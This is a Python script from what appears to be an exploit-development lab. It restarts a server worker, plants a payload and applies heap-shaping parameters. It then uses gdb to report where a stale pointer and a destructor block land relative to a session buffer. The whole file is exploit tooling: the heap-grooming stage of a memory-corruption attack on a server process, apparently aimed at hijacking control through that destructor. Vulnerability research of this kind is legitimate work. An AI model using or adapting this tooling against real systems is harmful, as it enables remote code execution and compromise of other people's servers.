#!/usr/bin/env python3
"""Plant with heap shaping and report where the stale P / dtor block land.

usage: shape.py <version> <shape> <kfree> [pad] [x1]
Fresh worker -> probe -> plant -> state.gdb.  x1 optional: report coverage of
the 131014-byte session buffer [x1+24, x1+24+131014).
"""
import json, os, re, sys, time
R = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(R, 'scripts'))
import lab


def main():
    v, shape, kfree = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
    pad = int(sys.argv[4]) if len(sys.argv) > 4 else 0
    x1 = int(sys.argv[5], 0) if len(sys.argv) > 5 else None
    s = lab.info(v)
    labd = lab.labdir(v)
    master = lab.rd(os.path.join(labd, 'run', 'master.pid'))
    child = lab.rd(os.path.join(labd, 'run', 'child.pid'))
    if not master or not lab.alive(master):
        lab.stop(v); time.sleep(0.3)
        master, child = lab.start(v)
    elif child and lab.alive(child):
        lab.kill_wait(master, child)
    newchild = lab.wait_child(master, exclude=child)
    assert newchild, 'no worker'
    lab.note_child(v, newchild)
    time.sleep(0.2)
    st = lab.drv(v, 'probe')
    pid = int(re.search(r'PID=(\d+)', st).group(1))
    assert pid == newchild, (pid, newchild)
    out = lab.drv(v, 'plant', str(pad), str(shape), str(kfree),
                  env={'PLANT_PAYLOAD': s['plant_payload']})
    assert 'stop' in out or 'AFTER' in out, out[-300:]
    txt, _ = lab.gdb(v, 'state.gdb', phase='shape_state.txt')
    P = int(lab.kv(txt, 'BG_DATA'), 16)
    B0 = int(lab.kv(txt, 'P_LAST_DTOR'), 16)
    plast = int(lab.kv(txt, 'P_LAST') or 0, 16)
    used = lab.kv(txt, 'DTOR_USED')
    res = {'version': v, 'shape': shape, 'kfree': kfree, 'pad': pad,
           'P': hex(P), 'B0': hex(B0), 'p_last': hex(plast), 'used': used,
           'worker': newchild, 'alive': lab.alive(newchild)}
    if x1 is not None:
        lo, hi = x1 + 24, x1 + 24 + 131014
        res.update({'x1': hex(x1), 'p_off': hex(P - (x1 + 24)),
                    'covered': lo <= P and P + 40 <= hi,
                    'b0_covered': lo <= B0 and B0 + 0x4010 <= hi,
                    'p_last_covered': lo <= plast and plast + 0x2008 <= hi})
    print(json.dumps(res, indent=1))
    json.dump(res, open(os.path.join(labd, 'phase', 'shape_%d_%d_%d.json' % (
        shape, kfree, pad)), 'w'), indent=1)


if __name__ == '__main__':
    main()
